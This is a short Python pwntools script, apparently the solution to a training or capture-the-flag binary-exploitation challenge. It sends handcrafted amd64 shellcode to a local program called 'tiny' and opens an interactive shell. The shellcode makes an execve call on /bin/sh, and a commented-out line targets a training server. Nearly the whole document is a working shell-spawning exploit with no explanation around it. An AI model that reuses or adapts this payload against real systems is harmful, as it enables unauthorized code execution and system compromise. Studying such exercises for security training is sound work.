from pwn import *

asm_code = """
mov al, 59
xor esi, esi
xor edx, edx
pop*36
syscall
pop*9 //to maintain align with /bin/sh
/bin/sh*18 + /bin/sh\0 to have the correct parameter
"""

context.arch = 'amd64'


#shellcode = asm(asm_code)
shellcode = b"\xB0\x3B\x31\xF6\x31\xD2" + b"\x8F\x07"*36 + b"\x0F\x05" + b"\x8F\x07"*9 + b"/bin/sh"*18 + b"/bin/sh\0"
p = process("./tiny")
#p = remote("bin.training.offdef.it", 4101)
p.send(shellcode)
p.interactive()